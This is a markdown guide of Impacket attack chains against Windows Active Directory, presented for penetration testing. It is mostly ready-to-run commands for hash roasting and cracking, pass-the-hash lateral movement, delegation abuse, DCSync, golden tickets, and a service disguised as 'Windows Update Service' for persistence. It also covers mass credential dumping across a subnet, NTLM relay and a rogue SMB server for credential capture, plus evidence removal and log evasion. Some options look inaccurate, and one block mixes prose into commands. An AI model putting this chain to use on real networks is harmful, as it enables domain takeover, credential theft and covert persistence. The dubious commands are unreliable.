# Impacket Attack Methodologies

This document outlines common attack chains and methodologies using Impacket tools for penetration testing and red team operations.

## Initial Access & Reconnaissance

### Phase 1: Domain Discovery
```bash
# Discover domain controllers
nmap -p 88,389,636 192.168.1.0/24

# Basic domain enumeration (no credentials)
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10
python3 GetUserSPNs.py domain.com/ -dc-ip 192.168.1.10
```

### Phase 2: Initial Credential Acquisition
```bash
# ASREPRoast attack
python3 GetNPUsers.py domain.com/ -dc-ip 192.168.1.10 -request -outputfile asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

# Kerberoasting attack (if you have any valid account)
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast.hash
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

## Lateral Movement Methodologies

### SMB-Based Lateral Movement
```bash
# Method 1: PSExec
python3 psexec.py domain.com/administrator:password@target.domain.com

# Method 2: SMBExec (alternative if psexec fails)
python3 smbexec.py domain.com/administrator:password@target.domain.com

# Method 3: WMIExec (stealthier)
python3 wmiexec.py domain.com/administrator:password@target.domain.com
```

### Hash-Based Movement
```bash
# Extract hashes from compromised system
python3 secretsdump.py domain.com/user:password@target.domain.com

# Use extracted hashes for lateral movement
python3 psexec.py -hashes :ntlmhash administrator@next_target.domain.com
python3 wmiexec.py -hashes :ntlmhash administrator@next_target.domain.com
```

## Privilege Escalation Chains

### Computer Account Abuse Chain
```bash
# Step 1: Add computer account
python3 addcomputer.py domain.com/user:password -computer-name EVILPC$ -computer-pass EvilPass123

# Step 2: Configure RBCD
python3 rbcd.py domain.com/user:password -action write -delegate-from EVILPC$ -delegate-to TARGET$

# Step 3: Request service ticket
python3 getST.py domain.com/EVILPC$:EvilPass123 -spn cifs/TARGET$.domain.com -impersonate administrator

# Step 4: Use ticket for access
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass TARGET$.domain.com
```

### DCSync Attack Chain
```bash
# Method 1: Direct DCSync (requires DA/EA privileges)
python3 secretsdump.py domain.com/domain_admin:password@dc.domain.com -just-dc

# Method 2: RBCD to DCSync
python3 rbcd.py domain.com/user:password -action write -delegate-from ATTACKER$ -delegate-to DC$
python3 getST.py domain.com/ATTACKER$:password -spn ldap/DC$.domain.com -impersonate administrator
export KRB5CCNAME=administrator.ccache
python3 secretsdump.py -k -no-pass domain.com@dc.domain.com -just-dc
```

## Persistence Methodologies

### Golden Ticket Persistence
```bash
# Step 1: Extract krbtgt hash via DCSync
python3 secretsdump.py domain.com/domain_admin:password@dc.domain.com -just-dc-user krbtgt

# Step 2: Create golden ticket
python3 ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com administrator

# Step 3: Use golden ticket
export KRB5CCNAME=administrator.ccache
python3 psexec.py -k -no-pass dc.domain.com
```

### Service-Based Persistence
```bash
# Step 1: Access target system
python3 psexec.py domain.com/administrator:password@target.domain.com

# Step 2: Create persistent service (in psexec shell)
sc create "Windows Update Service" binPath= "cmd.exe /c powershell.exe -WindowStyle Hidden -Command ..."
sc config "Windows Update Service" start= auto
sc start "Windows Update Service"

# Step 3: Use WMI for persistence
python3 wmipersist.py domain.com/administrator:password@target.domain.com
```

## Credential Harvesting Strategies

### Mass Credential Extraction
```bash
# Create target list
nmap -p 445 192.168.1.0/24 | grep "445/tcp open" | awk '{print $5}' > targets.txt

# Extract credentials from all accessible systems
for target in $(cat targets.txt); do
    echo "Attempting $target"
    python3 secretsdump.py -hashes :admin_hash administrator@$target
done
```

### Targeted High-Value Extraction
```bash
# Target domain controllers
python3 secretsdump.py domain.com/domain_admin:password@dc1.domain.com -just-dc
python3 secretsdump.py domain.com/domain_admin:password@dc2.domain.com -just-dc

# Target file servers (often have cached admin creds)
python3 secretsdump.py domain.com/admin:password@fileserver.domain.com

# Target SQL servers (service account credentials)
python3 mssqlclient.py domain.com/sa:password@sqlserver.domain.com -windows-auth
```

## Stealth and Evasion Techniques

### Low-Noise Enumeration
```bash
# Use stealth mode for Kerberoasting
python3 GetUserSPNs.py domain.com/user:password -dc-ip 192.168.1.10 -stealth -request

# Minimal LDAP queries
python3 GetADUsers.py domain.com/user:password -dc-ip 192.168.1.10 -all -debug
```

### Alternative Execution Methods
```bash
# Use DCOM instead of WMI/SMB
python3 dcomexec.py domain.com/administrator:password@target.domain.com

# Use scheduled tasks
python3 atexec.py domain.com/administrator:password@target.domain.com "whoami"

# File-less execution via registry
python3 reg.py domain.com/administrator:password@target.domain.com
```

## Network-Based Attacks

### NTLM Relay Chains
```bash
# Terminal 1: Set up responder
python3 Responder.py -I eth0 -w

# Terminal 2: Set up relay
python3 ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Terminal 3: Trigger authentication
# Send malicious documents, links, etc.
```

### SMB Server for Credential Capture
```bash
# Set up malicious SMB server
python3 smbserver.py -smb2support SHARE /tmp/share

# Plant UNC paths in documents, emails, etc.
# \\attacker_ip\SHARE\file.exe
```

## Multi-Domain and Forest Attacks

### Cross-Domain Attacks
```bash
# Enumerate trust relationships
python3 GetADUsers.py domain.com/user:password -all | grep -i trust

# Child to parent domain escalation
python3 raiseChild.py child.domain.com/child_admin:password

# Cross-forest attacks via trusts
python3 getST.py trusted.domain.com/user:password -spn cifs/target.parent.com -impersonate administrator
```

### Golden PAC Attacks
```bash
# Exploit MS14-068 (if applicable)
python3 goldenPac.py domain.com/user:password@target.domain.com
```

## Cleanup and OpSec

### Evidence Removal
```bash
# Remove created computer accounts
python3 GetADComputers.py domain.com/admin:password -computer EVILPC$ -delete

# Clean RBCD configurations
python3 rbcd.py domain.com/user:password -action remove -delegate-from ATTACKER$ -delegate-to TARGET$

# Remove created services
python3 services.py domain.com/admin:password@target.domain.com -action delete -name "BackdoorService"
```

### Log Evasion
```bash
# Use Kerberos authentication (generates fewer logs)
python3 psexec.py -k domain.com/user@target.domain.com

# Use alternative ports when possible
python3 smbclient.py domain.com/user:password@target.domain.com -port 8080

# Minimize command execution
python3 wmiexec.py domain.com/user:password@target.domain.com -silentcommand "minimal_command"
```

## Emergency Response Scenarios

### Rapid Domain Compromise
```bash
# If you get DA quickly
python3 secretsdump.py domain.com/domain_admin:password@dc.domain.com -just-dc -outputfile all_hashes.txt

# Create multiple golden tickets
python3 ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com administrator
python3 ticketer.py -nthash krbtgt_hash -domain-sid domain_sid -domain domain.com service_account
```

### Detection Response
```bash
# If detected, switch techniques
# From SMB to WMI
python3 wmiexec.py instead of psexec.py

# From cleartext to hash authentication
Use -hashes parameter instead of passwords

# From direct to relay attacks
python3 ntlmrelayx.py instead of direct authentication
```

## Tool Combination Matrix

| Primary Goal | Initial Tool | Follow-up Tools | Final Objective |
|-------------|-------------|----------------|-----------------|
| Credential Harvest | GetNPUsers.py | hashcat → secretsdump.py | Domain Admin |
| Lateral Movement | psexec.py | secretsdump.py → wmiexec.py | Network Spread |
| Privilege Escalation | rbcd.py | getST.py → psexec.py | System Admin |
| Persistence | ticketer.py | psexec.py → wmipersist.py | Long-term Access |
| Data Exfiltration | smbclient.py | find → get | Sensitive Data |

This methodology guide provides structured approaches for common attack scenarios using Impacket tools.
